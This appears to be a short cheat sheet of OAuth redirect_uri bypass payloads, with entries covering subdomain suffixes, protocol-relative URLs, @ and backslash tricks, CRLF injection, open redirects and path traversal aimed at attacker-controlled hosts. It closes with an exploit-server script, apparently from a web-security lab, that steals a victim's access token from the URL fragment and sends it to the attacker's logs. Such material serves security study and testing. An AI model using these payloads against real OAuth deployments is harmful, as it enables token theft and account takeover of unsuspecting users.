[#](#) OAuth

## Redirect_URi

StartsWith/IndexOf:

    &redirect_uri=https://vulnerable.com.attacker.com

Fake relative:

    &redirect_uri=//attacker.com

RFC

    &redirect_uri=https://attackers.com\@vulnerable.com
    &redirect_uri=https://attackers.com?@vulnerable.com

Multiline Regex:

    &redirect_uri=https://attacker.com%0a%0dtarget.com

Parameters:

    &redirect_uri=https://target.com/redir?u=//attackers.com
    
Can you path transversal + use a open redir in the app?

    &redirect_uri=https://target.com/oauth_callback/../post/next?path=https://attacker.com
    
    Exploit Server
    ```
    <script>
    // First CSRF
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        // Extracting the hash fragment and sending in to the logs...
        window.location = '/?'+document.location.hash.substr(1)
    }
    </script>
    ```
